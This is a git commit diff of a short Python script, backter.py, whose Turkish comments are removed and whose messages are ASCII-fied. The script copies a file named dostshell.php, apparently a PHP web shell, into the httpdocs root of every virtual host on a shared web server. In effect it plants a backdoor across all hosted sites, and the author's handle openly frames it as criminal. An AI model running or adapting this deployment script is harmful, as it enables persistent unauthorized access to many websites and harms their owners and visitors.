d6fbfbd2b571bb2854bf7ae9a3e0074add2d1e2a
CyBeR CRiMiNaToR <52202656+cybercriminator@users.noreply.github.com>
2024-11-23 03:31:31 +0400

    Update backter.py

--- backter.py
+++ backter.py
@@ -1,13 +1,11 @@
 import glob
 import shutil
 
-# Kaynak dosyanın yolu
 source_file = '/var/www/vhosts/dostshell.php'
 
-# Hedef dizinleri bul ve dosyayı kopyala
 for target_dir in glob.glob('/var/www/vhosts/*/httpdocs/'):
     try:
         shutil.copy(source_file, target_dir)
-        print(f"{source_file} kopyalandı -> {target_dir}")
+        print(f"{source_file} kopyalandi -> {target_dir}")
     except Exception as e:
-        print(f"Hata: {target_dir} içine kopyalanamadı. {e}")
+        print(f"Hata: {target_dir} icine kopyalanamadi. {e}")
